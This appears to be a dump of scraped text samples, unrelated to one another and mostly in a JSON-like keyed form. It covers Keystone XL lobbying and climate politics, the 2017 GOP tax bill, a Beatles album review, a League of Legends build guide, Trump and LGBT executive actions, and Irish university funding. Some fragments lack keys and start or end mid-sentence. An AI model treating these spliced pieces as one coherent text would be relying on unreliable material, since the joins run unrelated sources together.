reality.\"\n\nIn fairness, one must point out that politicians don't merely parrot industry claims and spout junk-science rationalizations purely for the campaign cash it brings in. Some, like Iowa Representative Steve King, who gets little campaign money from Big Oil, do it just because it's a cheap sop to constituents who might be persuaded that climate change could do them some good, in that \"we'd probably raise a little more corn.\"\n\nEven those who are not \"true believers\" in climate denial find it best to remain agnostic, even in the face of staggeringly compelling evidence. To wit, New Jersey Governor Chris Christie (R), who saw his state's coast get pounded into rubble by Superstorm Sandy in 2012, has maintained steadfast refusal to acknowledge that climate change may have contributed to the destruction his constituents suffered. Although Christie rarely shies from controversy, he contends that human-caused climate change is \"a scientific discussion and debate that I'm simply not engaged in.\"\n\n(American politicians haven't cornered the market on head-in-the-sand climate obliviousness: Canadian Natural Resources Minister Joe Oliver, the parliamentarian pushing the KXL project from the other side of the border, said NASA scientist Hansen's warning of \"game over for the climate\" was \"nonsense\" and that Hansen \"should be ashamed.\")\n\nIt's hard to ignore the fact that climate deniers in Congress uniformly come from one political party (although support for KXL is more bipartisan). It's troubling to recognize that many of them are on particularly powerful committees. But it wasn't always this way.\n\nThe Bipartisanship that Has Sailed\n\nFor much of America's history with environmentalism, the Republican Party plays a very prominent role. Recall that president Abraham Lincoln signed the law that preserved Yosemite Valley for public use; Pres. Theodore Roosevelt signed the Antiquities Act that would allow later presidents to protect natural resources by declaring them national monuments; and it was Pres. Richard Nixon who created the Environmental Protection Agency and signed the Clean Air Act.\n\nAmerica's bipartisan concern for the environment has an even more recent history. Remember that former House Speakers Newt Gingrich (R-GA) and Nancy Pelosi (D-CA) sat together in 2008 for a public service announcement on climate change, proclaiming that putting a stop to the crisis reached beyond party politics.\n\nIt's telling that three years later, while in the midst of a run for the GOP presidential nomination, Gingrich denounced the ad. He called it \"the dumbest thing I've done in the last four years.\"\n\nWhat was behind Gingrich's change of heart? Could it be his position was \"misconstrued,\" as he suggested as he furiously backpedaled from the idea that climate change should not be a partisan issue?\n\nMore likely, the Republican base veered sharply to the right, reflexively rejecting anything Democrats might support even though it could hurt them long term. Perhaps also, others suggest, Republicans' close ties to corporations make them more likely to curry favor through favorable legislation.\n\n\"We have seen some members of Congress who are likely to side with big oil over or to vote for various legislation to approve the Keystone XL pipeline,\" says Sittenfeld. \"Clearly they're getting their contributions from the Koch brothers or Karl Rove or the Chamber [of Commerce], or they've had runs ads run on their behalf. ... We've seen corporate profits really influencing the decisions that get made.\"\n\nPoliticians Make for a Great Return on Investment\n\nFrom a purely economic standpoint, political contributions are an astonishingly good investment for oil companies.\n\n\"One of the most profitable investments they make, one of the biggest returns they get on their money is the money that they pay into campaign contributions to politicians -- pay a few million dollars and they get back billions on those investments,\" says Oil Change International research director Lorne Stockman.\n\nThe Center for American Progress backs up Stockman's assertion. Its research finds that for every dollar the top five oil companies spent lobbying in Washington, they got back $30 in tax breaks. That translates to a 3000-percent return on investment.\n\nOf course, they don't limit their contributions to the federal level. If the pipeline is approved, state governments will have much to say about how it's routed, how construction will take place, and how landowners will be compensated when their property is seized. Many states are willing to pay for that privilege.\n\n\"States offer property tax breaks for pipeline companies to build pipelines through their states. So we see very favorable property tax terms on the state level for these kind of projects,\" says Stockton.\n\nOf Course ALEC Is Involved in the Keystone Cash\n\nNot willing to leave anything to chance, the oil industry is taking action to make sure state legislators see things their way. As the Center for Media and Democracy (which publishes PRWatch) reported, the American Legislative Exchange Council (ALEC) sent nine state legislators on an industry-paid field trip to the Alberta tar sands in 2012.\n\nALEC, which receives funding from TransCanada, the Koch brothers (whose Canadian subsidiary has tar sands investments), and other fossil fuel corporations, set up the event to put legislators in the same room as the industry lobbyists who paid for the lavish private-jet travel and fine dining. ALEC also prompted each of the nine legislators to send their corporate sponsors a thank you note, with a reminder of what the lobbyists had paid for the tour.\n\nCMD also uncovered emails between TransCanada's lobbyist and Ohio state Rep. John Adams in which the lobbyist provided Adams with a model bill in support of KXL, with Adams swiftly introduced in the legislature. The bill was co-sponsored by another participant in ALEC's Alberta field trip.\n\nPoliticians Prey on the Poor's Jobs Hopes\n\nBig Oil's influence extends even to, and perhaps most powerfully in, local politics. Port Arthur, Texas, where the KXL pipeline is slated to terminate, is essentially a one-industry town. What few jobs there are, are in the refineries that dominate the city's landscape, or in the small businesses that serve them. And with one in five people unemployed, and one in four living in poverty, those with jobs are unwilling to put their livelihoods at risk. Activists say that includes elected officials.\n\nCommunity organizer and environmental activist Hilton Kelley says what success his organization has had has come with little help from local politicians.\n\n\"A lot of times local government stands as a stumbling block in the way of local activists that are pushing for clean air and clean water, because they get the biggest part of their tax base from these industries,\" he says. \"Maybe one or two council members had the heart to stand up in city council in Port Arthur say something but they're soon ousted. They don't get reelected the following year.\"\n\nKelley recognizes that his independence from the refineries is a rare luxury in Port Arthur, and it allows him to take the lead. \"I have no connections to the plants,\" he says, \"therefore they can't really hurt me like they could someone who retired from the plant someone who has a kid who works at the plant.\"\n\n\"They could possibly lose their job and all they'd tell them is, 'We don't need you anymore,' or, 'We cut that position.' But the reason they're letting them go is because their mother or dad was seen on TV protesting with me. I don't hold any animosity toward those who are really intimidated to stand with me, because I understand the dilemma.\"\n\nAmerican Dreams Denied in American \"Sacrifice Zones\"\n\nThat dilemma is often exploited by industries that use economic desperation in the communities they occupy. In exchange for a few jobs, the companies get to pollute. It's a phenomenon called \"sacrifice zones.\"\n\n\"Oftentimes front-line communities, which tend to be low-income and minority communities, are left out of the conversation, ignored, and they bear the brunt,\" says Colarulli of the Sierra Club. \"They're often called 'sacrifice zones' these places where people are living in [squalid] conditions. This is not the American dream. This is not the way we should have people living in America.\"\n\nOf course none of this could happen without the media's acquiescence. We're not even talking about right-wing talkers like Rush Limbaugh, 2011 winner of Media Matters' \"Climate Change Misinformer of the Year\" award who recently told his listeners that they cannot concurrently believe in God and climate change. We're talking about the mainstream media that have given very little time to the issue of climate change and how KXL could impact it.\n\nWhere's the Media?\n\nThe mainstream media's failure to confront climate change is more a sin of omission then one of commission. The Daily Climate, an online publication that monitors news coverage of climate issues, has been tracking total coverage of climate change for the past several years. What they have found is shrinking coverage as the crisis has escalated.\n\nDespite the devastation of Superstorm Sandy, a drought that wrought havoc on more than half of the US, California's current epochal drought, and the fact that 2012 was the hottest year on record, total reporting on climate change dropped two percent from 2011. And climate coverage in 2011 was 20 percent less than in 2010, and just over half the amount of reportage in 2009, the year when the issue got the most attention in the mainstream media.\n\nLast year, the New York Times, \"the paper of record,\" and \"All the news that's fit to print,\" shut down its environmental reporting desk and its Green blog. Though the editors offered assurances that the paper would cover environmental issues with just as much vigor, reassigning the reporters and terminating two editorial positions makes that difficult to believe.\n\nEvidence indicates skepticism about those promises is well founded. On August 5, the American Geophysical Union and the National Oceanic and Atmospheric Administration each released major climate report. Neither garnered a mention in the Gray Lady.\n\nThe Times is not alone in cutting back on specialized environmental reporting. Inside Climate News, a Pulitzer Prize-winning online news outlet, reports that among the top five US newspapers by circulation, there are approximately a dozen reporters on the environment beat.\n\n(To its credit, the recently launched and unjustly attacked cable network Al Jazeera America dedicated a half-hour of its inaugural day to climate change, which propelled it to the fore of media outlets paying attention to the issue, topping Fox News' and CNN's combined total for the preceding four months.)\n\nWhen activist organizations can't get their issues covered in the mainstream media, they sometimes turn to the old-fashioned alternative: buying publicity. But for Green organizations, it appears that their money is not green enough to buy a seat at the table for the debate on KXL.\n\nThink Progress reports that the NBC television station in Washington DC rejected an advertisement by a group opposing KXL, despite the organization's assurance that its ad complied with all station policies. A station spokesman said it violated the policy against personal attacks.\n\nThe group, NextGen Climate Action, wanted the ad to run in conjunction with President Obama's August 2013 appearance on \"The Tonight Show.\" It parodies the specious and suspect claims made by TransCanada in its ads, such as the one that aired during the preceding Sunday's \"Meet the Press\" on the very same NBC station that rejected the parody.\n\nAll the News That's Fit to Print, on One Side?\n\nThe result in this case is a debate in which only one side gets to make its case.\n\n\"If you have a large enough bank account you can create a multifaceted campaign that involves buying politicians, influence peddling, and writing the story of energy policy from your perspective,\" says Public Citizen's Slocum. \"That is invaluable if you get to tell the story on your terms about climate change, if you don't have to have a rebuttal, and you don't have to have a fact check.\"\n\nTransCanada and the API have very large bank accounts. And they've been willing to open their checkbooks (to the tune of $153 million leading up to the 2012 election, or nearly four times what clean-energy groups spent) to tell the story their way. According to their adversaries, that story has what Slocum politely calls \"credibility problems.\" Others offer a more blunt assessment.\n\n\"TransCanada has lied repeatedly throughout this process, and unfortunately, some of their lies have been printed,\" LCV's Sittenfeld says.\n\n(Nation of Change has compiled a lengthy, but not exhaustive, list of misleading and/or unethical conduct on behalf of the KXL project.)\n\nNEXT: Tar Sands, corporate profits, and stopping \"game over\" for the climate.\n\nTell the State Department what you think about Keystone XL by taking action here.",

  "latent_27730": "The House of Representatives is set to vote on the final version of the GOP tax bill Tuesday, with the Senate to follow close behind. Most Republican members of Congress are heralding the plan’s giant, permanent tax cut for corporations as the reason behind their support. The GOP argues that when corporations get a tax cut, they put that money toward creating more jobs and raising wages.\n\nBut history shows that just isn’t correct — and history may be about to repeat itself.\n\nIn an interview with CNN Money, Wells Fargo CEO Tim Sloan made it clear what he plans to do with the corporation’s tax windfall — and it doesn’t benefit the average American worker.\n\n“Is it our goal to increase return to our shareholders and do we have an excess amount of capital? The answer to both is, yes,” Sloan told CNN Money. “So our expectation should be that we will continue to increase our dividend and our share buybacks next year and the year after that and the year after that.”\n\nAdvertisement\n\nAnd it’s not just Wells Fargo that stands to benefit. Goldman Sachs could also see a tax break worth up to $6 billion dollars from the GOP tax bill.\n\nGoldman says the tax bill will be good for the big banks: pic.twitter.com/KyaD5KVT8C — Jim Tankersley (@jimtankersley) December 18, 2017\n\nThe statement from Wells Fargo’s CEO confirms the suspicion that many observers had a few weeks ago, after White House chief economic adviser Gary Cohn attended an Wall Street Journal event where CEOs were asked whether their company plans to invest more if the tax reform bill passes.\n\nVery few hands went up.\n\nThis surprised Cohn, who asked, “Why aren’t the other hands up?”\n\nBut it shouldn’t be all that surprising. The general consensus among economists is that cutting corporate taxes to spur economic growth — known as “trickle-down economics” — hardly worked in the 1980s economy and would surely fail in today’s modernized economy.\n\nAdvertisement\n\nThe economy President Donald Trump is operating in is rife with start-ups, meaning corporations are more likely to invest in research and automation to stay competitive or turn over their gains to their shareholders, two things that generally don’t promote job growth. Even one of President Ronald Reagan’s economic policy advisers who helped shape the Republican myth of trickle-down economics now says it doesn’t work, calling the GOP rhetoric around tax cuts “wishful thinking.”\n\nThe American public is catching on to the scam as well. A recent CNN poll from Tuesday found only 33 percent of Americans say they favor the GOP tax bill, while 55 percent oppose it. Sixty-six percent of Americans say they believe the bill favors the wealthy over the middle class.",
  "latent_27759": "Each song on the sprawling double album The Beatles is an entity to itself, as the band touches on anything and everything it can. This makes for a frustratingly scattershot record or a singularly gripping musical experience, depending on your view, but what makes the so-called White Album interesting is its mess. Never before had a rock record been so self-reflective, or so ironic; the Beach Boys send-up \"Back in the U.S.S.R.\" and the British blooze parody \"Yer Blues\" are delivered straight-faced, so it's never clear if these are affectionate tributes or wicked satires. Lennon turns in two of his best ballads with \"Dear Prudence\" and \"Julia\"; scours the Abbey Road vaults for the musique concrète collage \"Revolution 9\"; pours on the schmaltz for Ringo's closing number, \"Good Night\"; celebrates the Beatles cult with \"Glass Onion\"; and, with \"Cry Baby Cry,\" rivals Syd Barrett. McCartney doesn't reach quite as far, yet his songs are stunning -- the music hall romp \"Honey Pie,\" the mock country of \"Rocky Raccoon,\" the ska-inflected \"Ob-La-Di, Ob-La-Da,\" and the proto-metal roar of \"Helter Skelter.\" Clearly, the Beatles' two main songwriting forces were no longer on the same page, but neither were George and Ringo. Harrison still had just two songs per LP, but it's clear from \"While My Guitar Gently Weeps,\" the canned soul of \"Savoy Truffle,\" the haunting \"Long, Long, Long,\" and even the silly \"Piggies\" that he had developed into a songwriter who deserved wider exposure. And Ringo turns in a delight with his first original, the lumbering country-carnival stomp \"Don't Pass Me By.\" None of it sounds like it was meant to share album space together, but somehow The Beatles creates its own style and sound through its mess.",

  "latent_28077": "Hi! I’m eStork, Cloth5’s newest writer and the team’s been great so far. Hope you like my first submission for Cloth5.com and be sure to recommend it to your friends!\n\nA somewhat household name amongst League of Legends players is the dreaded Blue Ezreal. What exactly is this build, you ask? It is a quirky build made popular by Taipei Assassin’s AD Carry, Bebe. Although variations exist, the original build was:\n\nIn case you don’t know why this build is so potent, the immense amount of self-peel and the cooldown reduction it provides frustrates many players to no end.\n\nAs mentioned before, as the build became more and more popular, variations arose. In OGN and recently by CLG’s Link, Blue Ezreal in the mid lane has become a favorable pick, while Doublelift showcased his variation in the NA LCS with a Tear of the Goddess > Bloodthirster build to overcome Blue Ez’s lack of pressure in lane and early teamfights. Blue Ezreal in the mid lane is great because you can rush a tear first and still be safe. Most AP Carries need some time to ramp up and produce damage, so this is where your high damage from your auto attacks and your Mystic Shot will do you wonders. Starting with a Doran’s Blade will allow you to trade efficiently with your opponent in the mid lane and you will come out ahead since your basic attacks do not use a resource, while your opponent’s form of harass will use mana or energy. The lane is also very short, so your Arcane Shift will cover most of the distance you will have to retreat, keeping you safe from jungle ganks. To top it all off, your higher AD values compared to your lane opponent will allow you to put down more damage on turrets and push faster than a conventional mid can. More on this topic will be discussed later.\n\nNow, when is Blue Ezreal optimal?\n\nSome people seem to think Blue Ez is great in any situation and pick it in any team composition, but what kind of team should you pick Ezreal against? Well, obviously Blue Ez is great in a poke comp with some disengage to compliment’s Ez’s own. Any short range composition will frustrate your enemy immensely. However, a team with multiple sources of hard engage will make it significantly tougher to keep your distance.\n\nLet’s talk about the math!\n\nWith 4% CDR from the offense mastery tree, Iceborn’s 10% CDR, another 15% from CDR boots and Spirit of the Elder Lizard, you get a whopping 39% CDR without blue buff. However, use of Spirit of the Elder Lizard has declined but, without it, a blue buff will get you to the 40% CDR cap.\n\nMoving onto runes and masteries:\n\nThere are many different mastery paths you can use. As with most AD Carry’s, the most generic mastery path is the 21/9/0. If you choose to use Ezreal for mid, 21/0/9 is more useful so you can use more Mystic Shots to compensate for Ezreal’s poor early wave clear. For runes, 2 or 3 lifesteal quints are used to get your 4% or 6% lifesteal, respectively. For marks, you can use 9 attack damage marks. You can also exchange one AD mark for a crit mark, which is my personal preference as one crit can change the momentum of a lane in the early game. The best seals are armor runes and, taking a page out of MVP Imp’s (rune) book (HA! get it?), 6 flat MR glyphs and 3 flat Mana regen glyphs are preferable. This gives you even more mana to use your skills and stack your tear.\n\nGameplay:\n\nEarly laning:\n\nBefore your first back, Ezreal is on par with other AD carries in terms of itemization. Most start with Doran’s Blade, so you are not at a disadvantage. However, because a Blue Ezreal must spend 700 early gold essentially on mana, you have an automatic 700 gold deficit against other AD carries after your first back. At that point, you want to play passively and farm up until you get your core items. Whether you get the Tear early, or a bit later in the game, keep in mind that you automatically have 700 gold less than your opposing AD carry.\n\nMid game:\n\nOnce you get your Iceborn Gauntlet (either before or after completing Manamune), you are set to go. Although you will not do as much damage as an opponent who went for a traditional AD Carry build, you will have more kiting potential with the slow proc from the Gauntlet. Try to never use your Arcane Shift offensively and save it for an escape. Once you have max CDR, your Mystic Shot is on a 2.4 second cooldown and your Arcane Shift is on a 6 second cooldown. If you hit anything with your Mystic Shot, all your cooldowns will be lowered by one second, which will essentially make your Q spammable.\n\nLate game:\n\nNow that you have your full build of: Muramana, CDR boots, Iceborn Gauntlet, Bloodthirster/Blade of the Ruined King, Last Whisper, and your choice of defensive item, you have reign over when you want to engage. You can slow the opposing team as long as you proc your Gauntlet passive and can keep them at bay, lest they be poked down. Even at this late game stage, you will do less damage than a traditional 6 item AD Carry but, once again, your power is in your utility. Even if the other team seems to have won the fight, you should be able to kite them to death.\n\nExamples of Blue Ezreal in Professional Play\n\nOn to the most interesting part!\n\nTraditional Blue Ezreal in Week 4 NA LCS\n\nCloud 9’s AD Carry, SneakyCastro, showed us how powerful a Blue Ezreal could be with the proper team composition. Because the pick/ban phase is so important in crafting a good team composition, let’s talk about C9’s mindset going into this game. The first ban out by C9 was the Karthus, targeted at Crs Nyjacky. The second and third bans were Nunu and Elise. Cloud 9’s picks (on purple side) were, Twisted Fate and Thresh as their first two picks, Rumble and Jarvan IV as their next picks, and saved their Ezreal pick for last. Sneaky built his Blue Ezreal with little to no variance from the original build. Let’s take a look at the item path that Sneaky went for:\n\nAnd now the fun part! Let’s discuss the bans now that we know Cloud 9’s team composition. Rumble and Jarvan need to be close to their enemies for their Cataclysm + Equalizer combination to work effectively and that is exactly the kind of thing Karthus wants. Karthus can turn on his defile and will love to stand right next to you. The Nunu ban was just to get rid of a nuisance, but the Elise ban is important. Elise’s Rappel allows her to bypass all opposing team members and pick who she wants to jump on. The Rappel combined with a follow-up Cocoon effectively shuts a Blue Ezreal down in a teamfight if done correctly. The goal of Cloud 9’s entire team comp is to lock down the enemy and allow Ezreal to do as he pleases. If by some chance the enemy gets near Ezreal, Thresh can use The Box and create even more safety for Sneaky, who ended the game with an impressive score of 12/0/6. Although Sneaky did great, the perfect Equalizers with Cataclysm follow up really won Cloud 9 that game. This is possibly the most traditional Blue Ezreal build you can use, and Sneaky has shown that, with the right team comp, it is just as effective as any other variation.\n\nBloodthirster Rush by Doublelift in Week 5 NA LCS\n\nIn Week 5 of the NA LCS, we saw Counter Logic Gaming’s Doublelift use his patented Bloodthirster first Blue Ezreal build against TSM. Just like last time, let’s go through the picks and bans before talking about any strategy. CLG banned Karthus, Jayce, and then Nunu. Like Cloud 9, they were purple side. CLG chose Thresh and Nocturne as their first two picks, followed by Orianna, Ezreal, and Irelia to wrap it all up. The idea behind this team comp is a little different to Cloud 9’s. If they wanted to engage, Nocturne could use Paranoia and dive to the back lines, along with Irelia, and cause so much disruption that it would divert some pressure away from Doublelift. Cloud 9 used their team comp to lock people up, and CLG used theirs as a distraction to draw attention away from, not only killing Doublelift, but keeping TSM’s carries alive. In case Dyrus, TheOddOne, and Xpecial decide to ignore Nocturne and Irelia, Chauster could use Thresh’s ultimate to keep divers at bay. With Link’s amazing ball control, I’m sure Doublelift felt safe knowing that a Shockwave would pull back any threats immediately. Now, onto the item build!\n\nAn important thing to note about Doublelift’s variation is that it requires a lot more gold to get that critical Blue Ezreal item build because of the cost of the Bloodthirster. Doublelift can do this because CLG lets him split push all game long. In this game in particular, Doublelift was left to farm bot for an extremely long time while the rest of the team defended pushes. CLG wanted to avoid starting a fight during Doublelift’s power-up stage. However, as soon as the Muramana was complete, CLG looked to make a move.\n\nMVP Dade’s Beautiful Mid Ezreal Play\n\nIn the group stages of OGN’s Hot6ix Champions Summer, Dade gave us a quick view as to why Blue Ezreal is becoming popular in the mid lane over in Korea. Getting an early Tear of the Goddess on Blue Ezreal as a mid laner doesn’t handicap you as much as in a duo bot lane. Many AP Carries require a few items before becoming powerful and Ezreal’s constant Mystic Shot and auto attack damage can create good damage early on, even with a rushed Tear. MVP Ozone banned Vladimir, Lee Sin, and Ryze. The Vladimir ban wasn’t necessarily important to stopping their comp, but more of a target ‘OP’ champion ban, as split push Vladimir is very popular in Korea. The Lee Sin ban was to stop the possible Resonating Strike into Dragon’s Rage combo that looks so cool, in addition to being extremely effective. A good Lee Sin (as all Korean junglers are), can wreak havoc on a Blue Ez as the slow does not prevent him from flying towards you and kicking you towards his team. The Ryze ban was also an ‘OP’ champ ban as top lane Ryze has proven to be extremely strong and could have messed with their Yorick pick, as you will see below. Ozone decided to pick Ezreal on blue side as their second pick after seeing Jin Air Falcons pick Zyra and Kennen. Ezreal can Arcane Shift pretty effectively out of both those ults, rendering those both champions basically useless against him. The full team is: Homme on Yorick, Dande on Nunu, Dade on Ezreal, and Imp with Mata on Twitch and Thresh, respectively. A successful level one fight gave Dade first blood and an assist. After this fight, Ozone pushed their advantage and won the game outright. Although the game was a stomp, we can still look at how Dade would build his Blue Ezreal because all went well:\n\nThe item path past the first couple items is basically the same as a duo bot Blue Ezreal. The advantage being, that the mid Ezreal can safely rush a Tear. This team comp also proved very effective for Blue Ezreal. Nunu’s ult creates a gigantic AOE slow and allows Ezreal to kite effectively even if he did not have an Iceborn Gauntlet. Throw in Thresh’s potential to create another slow with his ult and you have a pretty safe time as a Blue Ezreal. The Yorick pick was mainly to create a clone of Twitch, since Ezreal’s auto attack damage is not as high as Twitch’s because he opted for Blue build. Hope you liked this comprehensive, albeit long, article on the background of Blue Ezreal and what the pros think are good team comps for him. Have a good day!",

The project is expected to take three years to complete and will create thousands of construction jobs and more than 500 permanent jobs once the building opens, officials said.Activist Bob Israel crashed the groundbreaking event Wednesday, complaining that African American workers are not getting their share of construction jobs on downtown projects.\"My concern is minority participation in a billion dollar project.

Because they don’t have the force of law, a new president could undo those with the stroke of a pen.\n\nChief among those actions is Obama’s 2014 executive order prohibiting federal contractors from engaging in anti-LGBT workplace discrimination. Obama signed the executive order after the Republican-controlled U.S. House failed to pass the Employment Non-Discrimination Act (and after many LGBT groups dropped support for the bill over a religious exemption more expansive than one under current civil rights law).\n\nTJ Helmstetter, a spokesperson for the Democratic National Committee, said Trump is “reckless, incoherent and dangerous” on a range of issues a poses a “serious threat” to advances in LGBT rights if elected president.\n\n“The LGBT community would be set back decades,” Helmstetter said. “Trump would rescind President Obama’s pro-equality executive orders and he would appoint pro-discrimination Supreme Court justices. He would sign laws that allow businesses to kick out gay customers and ban transgender people from using the bathroom. The stakes could not be higher for our community and for all Americans.”\n\nThe Center for American Progress has compiled a list of eight executive actions benefiting LGBT rights enacted under the Obama administration that Trump could undo. Among them is a rule prohibiting anti-LGBT discrimination in health care and insurance, a Department of Housing & Urban Development regulation prohibiting anti-LGBT bias in government-sponsored housing and endorsement of federal LGBT non-discrimination legislation known as the Equality Act.\n\nLaura Durso, senior director of the Center for American Progress’ LGBT research and communications project, said the initiatives show the breadth of leadership on LGBT rights under Obama.\n\n“These actions are in stark contrast to the outright hostility we have seen in a conservative-controlled Congress and, unfortunately, we have no reason to believe that a President Trump would advocate for LGBT issues in opposition to these members,” Durso said. “It is instructive that his list of potential Supreme Court nominees includes demonstrably anti-LGBT jurists.”\n\nIt’s hard to say to what extent — if at all — Trump would seek to roll back the advancements under his administration. After all, Trump hasn’t been as vitriolic in attacks on LGBT people as he has been with other minorities, including Latinos, women, the disabled and black activists. Still, Trump has said he’d consider appointing justices to the U.S. Supreme Court who would reverse the ruling in favor of nationwide marriage equality and would sign the First Amendment Defense Act, a religious freedom bill seen to enable anti-LGBT discrimination, if Congress delivered it to his desk.\n\nTrump has sworn to undo Obama’s executive actions that he deems unconstitutional — as soon as in one hour or even two minutes – after taking the oath of office on Inauguration Day. At a campaign town hall rally in December, Trump lamented, “the system is supposed to work” with Congress passing bills that are signed into law by the president, not executive orders.\n\n“And then, all of a sudden, I started hearing: ‘Oh, well, he tried. He can’t do it.'” Trump said. “And boom. And another one, boom. And you have these executive actions. I don’t even think he tries anymore. I think he just signs executive actions.”\n\nThe candidate was speaking in reference to Obama’s immigration actions and it’s unclear he would include initiatives benefiting LGBT people among the orders he would undo. The Trump campaign didn’t respond to the Washington Blade’s request for comment for this article on whether pro-LGBT initiatives would be among the actions he would undo.\n\nBut Trump already has vowed to rescind one LGBT action in particular. In an interview last month with the Washington Post, he said he would rescind the joint guidance from the Departments of Justice and Education prohibiting schools from discriminating against transgender students and guaranteeing them access to the restroom consistent with their gender identity. At the same time, Trump insisted “you have to protect everybody” and said transgender people are a small part of the population.\n\nOne legislative change is also on the table for Trump to change: “Don’t Ask, Don’t Tell” repeal. When Congress repealed the gay military ban in 2010, lawmakers left nothing in its place directing the U.S. military not to discriminate against or eject troops based on sexual orientation. Trump could institute a change that would administratively restore “Don’t Ask, Don’t Tell.”\n\nMatthew Thorn, executive director of the LGBT military group OutServe-SLDN, nonetheless said he doesn’t think Trump would be able to reverse openly gay military service.\n\n“I think the service chiefs would strongly object to any administrative action from Trump on a reinstatement of a DADT,” Thorn said. “We are approaching five years since the repeal this September. I would find it highly unlikely that the Pentagon would reverse and reimplement a ban and conversations our organization has had are in line with that.”\n\nThe real danger, Thorn said, is Trump rolling back administrative changes, such as those benefiting LGBT veterans or status of forces agreements allowing service members to bring a same-sex spouse with them or overseas, or halting movement on lifting the ban on openly transgender service.\n\n“If a Trump presidency could exist he would be met with strong objection and hearty voices from our organization and I strongly believe amongst individuals inside the Pentagon and Veterans Affairs department on any changes or reversal of advancements made for the LGBT military community,” Thorn said.\n\nTrump has made one commitment to advance LGBT rights, but it was made 16 years ago and in this election cycle he hasn’t said whether he would follow through with it. In a 2000 interview with The Advocate, Trump said he’d support amending the Civil Rights Act of 1964 to include sexual orientation, which is similar to the Equality Act pending before Congress (although he’s made no mention if he supports transgender inclusion, which the legislation also encompasses).\n\nFor months, the Trump campaign hasn’t responded to the Washington Blade’s request for comment on whether the candidate still supports adding sexual orientation to federal civil rights law, or if his position has since changed.\n\nCharles Moran, a gay Republican activist seeking to represent Trump as a California delegate to the Republican National Convention, doubted Trump would seek to roll back LGBT rights because he “has not waded into the messy world of social politics” over the course of his campaign.\n\n“I don’t think he’s going to be keen to jump in and start reversing President Obama’s executive orders,” Moran said. “While President Obama expanded the use of executive orders for LGBT protections, there were a number he simply continued from President Bush’s days. So hypothetically could a President Trump reverse some of President Obama’s executive orders concerning LGBT protections or rights? Of course. Is this likely to happen given his public policy positions and private business decisions leading up to this point? Absolutely not.”\n\nMoran didn’t respond to a follow-up email to identify an LGBT protection that Obama continued from former President George W. Bush, who has a reputation for being anti-gay. When Obama signed his 2014 executive order against anti-LGBT workplace discrimination, he left in place a Bush-era religious exemption permitting religious organizations that are federal contractors to favor co-religionists in hiring practices.\n\nPointing to contributions Trump made to HIV/AIDS organizations, as reported by The New York Times, and the candidate’s support for gay rights in 2000, Moran said Trump is “the most LGBT-friendly candidate the Republican Party ran in 2015/2016.”\n\n“While he does not have an electoral or legislative record to point to, he does have a business and philanthropic track record to read, and those indications look good for the LGBT community,” Moran said.\n\nAt the end of the day, a commitment from Trump on LGBT rights may not mean much. As Slate’s Jordan Weissman wrote earlier this month, Trump tends not to have policy positions, but “policy moods” that change as easily as the direction of the wind.\n\nTake, for example, Trump’s position on North Carolina’s recently enacted House Bill 2. Trump initially expressed opposition to the anti-LGBT law, which bars cities from enacting pro-LGBT non-discrimination ordinances and prohibits transgender people from using the public restroom in school and government buildings consistent with their gender identity. But on the same day in a later interview, Trump backtracked on those views, saying “local communities and states should make the decision” on whether transgender people should be able to use restrooms consistent with their gender identity.\n\nA number of safeguards are in place that would prevent Trump from making too many changes against LGBT rights, as least rapidly. The Administrative Procedure Act — a law enacted by Congress in 1946 governing the way in which administrative agencies may propose and establish rules — prohibits a quick change in regulation if a hostile administration takes over. Instituting new final regulations repealing these policies would be a multi-year process and require a justification for overturning them other than for political reasons.\n\nOther changes are firmly in place as a result of law or changes by the courts. Although Trump has said he’d seek to appoint justices who’d overturn marriage equality, that effort would be a long shot and he unilaterally couldn’t change the right for same-sex couples to marry because the U.S. Supreme Court determined that’s a right afforded under the U.S. Constitution.\n\nTrump may rescind the Obama administration order prohibiting schools from discriminating against transgender students, but that’s based on case law developed over two decades determining anti-trans bias amounts to gender discrimination under federal law. Courts and the U.S. Equal Employment Opportunity Commission have now begun to make the same determination for sexual-orientation discrimination.\n\nBut despite the independence of the judiciary, it wouldn’t be immune to a Trump presidency seeking to reverse advances on LGBT rights.\n\nJon Davidson, legal director of Lambda Legal, declined to comment on any particular presidential candidate, but said the election is happening “in a critical period” of legal understanding of anti-LGBT discrimination and the next person who occupies the White House could influence that.\n\n“Having federal judges who will rule fairly on these issues is essential,” Davidson said. “Whoever is president will influence the future composition of the EEOC, the Department of Justice’s leadership, and the makeup of the federal judiciary. In particular, given the Senate’s refusal to consider the nomination of Judge Garland to the Supreme Court, a future president may well choose who will fill the late Justice Scalia’s seat. While we can hope that, regardless of who is elected, those the future president appoints will continue to recognize that sexual-orientation discrimination is a form of sex discrimination barred by current federal statutes, that remains to be seen.”\n\nObama’s LGBT executive actions Trump could undo\n\n∙ Executive Order prohibiting federal contractors from discriminating on the basis of sexual orientation or gender identity.\n\n∙ Final rule in May 2016 that protected LGBT people from discrimination in healthcare and insurance under the Affordable Care Act.\n\n∙ Prison Rape Elimination Act implementation regulations in May 2012 to directly protect LGBT people.\n\n∙ Equal Access to Housing in HUD Programs Regardless of Sexual Orientation or Gender Identity Rule in February 2012, protecting LGBT people in all HUD­-funded programs.\n\n∙ Comprehensive guidance in May 2016 on their interpretation of Title IX, clarifying that public schools receiving federal funding must treat transgender students in accordance with their gender identity.\n\n∙ Guidance in July 2013 that all immigration visa petitions filed on behalf of a same­-sex spouse would be reviewed in the same manner as those filed on behalf of an opposite­-sex spouse.\n\n∙ The Global Equality Fund, launched in 2011, which supports programs that advance the human rights LGBT persons around the world.\n\n∙ Public endorsement of the Equality Act in November 2015, supporting comprehensive federal nondiscrimination protections for LGBT people.\n\nSource: Center for American Progress",
  "latent_28479": "The likelihood of the Government deciding before the next general election on a new funding model for higher education has all but disappeared with the announcement of a working group to examine the issue.\n\nMinister for Education Ruairí Quinn, who political sources believe will be reshuffled out of office in the autumn, announced the establishment of the working group yesterday as he published a major report on the sector’s performance.\n\nThe group is being asked to assess “the long-term funding requirements” of the higher education sector, “along with a set of funding options for consideration by the Minister”.\n\nThe Higher Education Authority (HEA) had already been working on a report into this issue of “sustainability”. This was due to be published this autumn and it is understood it was leaning towards a recommendation for a student loan system similar to that in Australia.\n\nInterim report\n\nAs well as looking at funding, the group will examine the economic benefits of higher education and how to measure efficiencies in the sector.\n\n“I think first and foremost we need to have a debate in this country about funding of third-level education. There are no easy answers here,” said Mr Quinn.\n\nHe noted the UK approach of massively increasing fees “on the basis that the market would solve all its problems . . . has crashed in flames”, while in the US student debt was now the second highest category of debt after the national debt.\n\nMr Quinn was speaking at the publication of the first Higher Education System Performance Report, setting targets for 2014-2016. The report is the culmination of 